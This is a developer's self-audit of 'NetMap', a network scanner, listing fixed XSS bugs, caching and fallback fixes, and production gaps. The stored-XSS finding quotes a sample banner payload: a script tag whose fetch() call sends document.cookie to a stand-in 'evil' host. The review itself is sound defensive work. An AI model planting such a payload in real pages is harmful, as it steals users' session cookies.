# NetMap — Self-Audit

A review of the codebase as of the dashboard/multi-subnet update, covering
correctness, security, and things I'd flag in a real code review. Written as
a project artifact — it's genuinely useful to be able to show a reviewer
that you audited your own tool, not just built it.

## Findings & fixes made during this review

### 1. Stored-XSS in `report.py` (fixed)
`report.py` rendered scan data — including `product`/`version`/`name`
fields pulled straight from nmap service banners — through a plain
`jinja2.Template(...)`, which does **not** autoescape by default. Service
banners are attacker-controlled: any host on the scanned network chooses
its own banner string. A host advertising a banner like
`<script>fetch('https://evil/steal?c='+document.cookie)</script>` would
have that execute when the generated `report.html` is opened in a browser.

**Fix:** switched to `jinja2.Environment(autoescape=True)`. Verified with a
test that injects a `<script>` tag as a fake service banner and confirms it
comes out HTML-escaped in the rendered report.

### 2. Same class of bug in `visualizer.py` tooltips (fixed)
pyvis renders a node's `title` as raw HTML for the hover tooltip. The
tooltip strings were built with plain f-string interpolation of the same
attacker-controllable banner fields. **Fix:** added an `_e()` helper
(`html.escape`) and applied it to every interpolated value before it goes
into a tooltip string.

### 3. OSINT lookups weren't cached (fixed)
`osint.py` re-queried Shodan on every single scan for every public IP, with
no caching layer — unlike `cve_lookup.py`, which was cached from the start.
Shodan's free tier has very limited query credits; running `--interval`
scans with `--shodan` enabled would burn through them fast. **Fix:** added
the same SQLite-cache pattern used for CVEs (7-day TTL by default),
including caching negative results so a failing lookup doesn't get retried
every scan either.

## Known limitations (by design, not bugs — but worth being able to explain)

- **CVE matching is NVD keyword search, not precise CPE matching.** nmap
  banners don't reliably expose a vendor string, so an exact CPE 2.3
  identifier usually can't be built. This trades precision for coverage —
  expect some false positives/negatives compared to a real vulnerability
  scanner (Nessus/OpenVAS) doing proper CPE matching.
- **The ATT&CK mapping is a small hand-curated table**, not the live ATT&CK
  STIX dataset. Good enough to demonstrate the integration and produce a
  real Navigator layer; not authoritative. `mitreattack-python` would be
  the upgrade path if this needed to be defensible in a real assessment.
- **No rate-limit-aware batching for large scans.** Without an NVD API key,
  each CVE lookup sleeps ~6s before firing. Scanning a /24 with many
  services will take a while on the free tier. An API key
  (`NVD_API_KEY`) cuts that to well under a second per call.

## Things I'd still want before calling this "production"

- **No authentication in front of `dashboard.py` unless `DASHBOARD_PASSWORD`
  is set.** It warns loudly at startup when unset, but the default is still
  "open" — that's a reasonable default for local/lab use, a bad one for
  anything shared. If you deploy this anywhere beyond your own laptop, set
  the password and put it behind HTTPS (e.g. a reverse proxy).
- **`/api/scan` runs a subprocess** (`main.py`) when explicitly enabled via
  `NETMAP_ALLOW_SCAN_TRIGGER=1`. The scan range is fixed from server-side
  config (`NETMAP_RANGE`), never taken from the HTTP request, specifically
  so this endpoint can't be turned into a "scan arbitrary target" primitive
  by a client. Worth calling out explicitly if this ever gets extended to
  accept a range from the request — don't do that without real input
  validation and auth.
- **No unbounded-growth protection on the SQLite caches** (`cve_cache.db`,
  `osint_cache.db`). Fine at demo/lab scale; a long-running deployment
  would want eviction or a size cap.
- **No CI.** Tests exist and are mocked so they run offline, but nothing
  runs them automatically on push — a GitHub Actions workflow running
  `pytest` would be a quick, high-value addition (and a good resume line).
- **No `.gitignore`/`LICENSE`** previously — added both in this pass.
  Scan output, history snapshots, and the SQLite caches are now git-ignored
  since they contain scan results from whatever network you point this at.

## Addendum: mitigation, rogue-detection, alerting, Nuclei round

- **`mitigation.py` only surfaces patch/advisory links that NVD itself
  returned** for a CVE (`references` with `Patch`/`Vendor Advisory` tags,
  falling back to whatever's first if untagged). It deliberately never
  invents "here's the fix" text tied to a specific CVE -- the hardening
  bullets are generic best practice by service type, not CVE-specific
  claims.
- **`/api/scan` in `dashboard.py` and the alerting subprocess call in
  general are the two places external input could theoretically reach a
  shell-adjacent call.** Both are locked down: the scan range comes from
  server-side env config only, never the HTTP request body. Don't change
  that without adding real validation.
- **`inventory.py`'s rogue-device check is a baseline comparison, not a
  security boundary** -- it flags what wasn't in your allowlist, it
  doesn't verify identity (MAC addresses are trivially spoofable). Good
  for "did something unexpected show up," not for access control.
- **OUI vendor table (`oui.py`) is ~30 entries, illustrative only.** nmap's
  own bundled OUI database is used first and is far more complete; the
  local table and the online fallback exist for cases nmap doesn't
  resolve.
- **Nuclei runs active probes against real services.** Unlike the passive
  NVD keyword lookup, `--nuclei` sends real HTTP requests designed to
  detect specific vulnerabilities. Only ever point it at hosts you're
  authorized to test -- this is true of the whole tool, but especially
  true here.

## Addendum: line-by-line review pass

Two real bugs found by reading every line rather than just testing happy
paths:

- **`visualizer.py`'s pyvis-missing fallback was silently broken.**
  `visualize_graph_interactive()` called `visualize_graph_static(G)` with
  no `output_path` on ImportError, which defaults to `None` -- that
  branch calls `plt.show()` instead of saving a file, which does nothing
  useful in a non-interactive/headless run. The net effect: if pyvis
  isn't installed and `--static` isn't passed (the default), no topology
  file was written at all, silently, despite the console still printing
  "Graph: topology.html" as if it worked. Every test that exercised this
  path up to now had called `visualize_graph_static()` directly with an
  explicit path, which is exactly why it went unnoticed -- the bug was
  specifically in the *fallback wiring*, not in either function alone.
  Fixed: the fallback now derives a `.png` path from the requested
  `.html` path and passes it through, with a printed note explaining the
  substitution.
- **`.gitignore` patterns weren't root-anchored.** `topology.png` (no
  leading `/`) matches at *any* depth in a git repo, which meant the real
  screenshot at `docs/screenshots/topology.png` would have been silently
  excluded from version control the moment this got pushed -- a
  meant-to-be-committed asset quietly disappearing. Fixed by anchoring
  every generated-output pattern with a leading `/`. Also added
  `epss_cache.db` and `oui_cache.db`, which were missing entirely (added
  in later rounds without updating `.gitignore` to match), and
  `known_devices.json` (a user's real local device inventory, same
  privacy logic as the other excluded output).

- **`report.py` dropped mitigation guidance entirely for a host with zero
  open services.** A host can be up (responds to discovery) but have
  nothing open in the scanned port range -- a real, not-hypothetical case
  for simple IoT devices. The services table used a plain `{% for %}`
  loop with no `{% else %}`, so an empty `services` dict rendered zero
  `<tr>`s, and the mitigation-guidance cell (gated on `loop.first`) never
  fired -- the host's card silently showed no guidance at all instead of
  at least the tier-priority text. Fixed with an explicit `{% else %}`
  branch; covered by `tests/test_report.py`.

## What's solid

- Core pipeline (discovery → service detection → CVE enrichment → risk
  scoring → ATT&CK mapping → viz/report) is covered by a mocked test suite
  and was verified end-to-end against a real network by hand (see the
  session that produced this audit) — the CVE results it returned (vsftpd
  2.3.4 backdoor, OpenSSH 7.2 CVEs including the Terrapin downgrade attack)
  are all real, correctly-matched, well-known vulnerabilities for those
  exact versions, which is a good sanity check that the NVD integration is
  behaving correctly.
- History diffing correctly normalizes JSON's string-keyed ports back to
  ints before comparing against in-memory int keys — an easy bug to miss.
  Caching keys are case/whitespace-normalized in both `cve_lookup.py` and
  `osint.py`.
